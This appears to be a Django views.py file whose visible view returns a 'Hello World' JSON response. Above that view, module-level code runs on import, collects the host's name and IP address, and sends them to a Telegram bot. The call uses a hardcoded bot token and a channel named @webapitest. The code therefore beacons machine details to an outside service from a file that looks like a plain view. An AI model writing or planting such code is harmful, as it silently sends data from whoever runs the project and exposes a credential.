from django.http.response import JsonResponse
import socket, requests

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)


message = f"Your Computer Name is: {hostname}\n Your Computer IP Address is: {IPAddr}"

r = requests.get(f'https://api.telegram.org/bot5461824848:AAG_BD8yb1hUV-mTJS2tjj1o1IabDupxzTE/sendMessage?chat_id=@webapitest&text={message}')
print(r.text)
print(r.status_code)

# Create your views here.
def index(request):

    return JsonResponse({'Hello': 'World'})
